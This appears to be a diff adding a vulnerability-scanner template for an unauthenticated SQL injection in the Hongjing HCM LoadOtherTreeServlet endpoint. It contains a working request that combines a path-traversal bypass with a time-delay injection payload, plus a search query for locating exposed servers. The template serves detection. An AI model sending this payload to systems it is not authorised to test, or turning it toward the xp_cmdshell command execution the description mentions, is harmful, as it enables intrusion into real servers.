@@ -1,0 +1,27 @@
+id: hjsoft-loadothertree-sqli
+
+info:
+  name: 宏景 HCM 系统 LoadOtherTreeServlet - sqli
+  author: leadlife
+  severity: high
+  description: 宏景 HCM 系统 /gz/LoadOtherTreeServlet 接口处存在SQL注入漏洞，未经身份验证的远程攻击者通过利用SQL注入漏洞配合数据库xp_cmdshell可以执行任意命令，从而控制服务器。经过分析与研判，该漏洞利用难度低，建议尽快修复。
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E5%AE%8F%E6%99%AFeHR%E4%BA%BA%E5%8A%9B%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3LoadOtherTreeServlet%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    fofa-query: app="HJSOFT-HCM"
+  tags: sqli, hjsoft,time
+
+http:
+  - raw:
+    - |
+      @timeout: 15s
+      GET /w_selfservice/oauthservlet/%2e./.%2e/gz/LoadOtherTreeServlet?modelflag=4&budget_id=1%29%3BWAITFOR+DELAY+%270%3A0%3A6%27--&flag=1 HTTP/1.1
+      Host: {{Hostname}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - duration >= 5 && duration < 9
+        condition: and
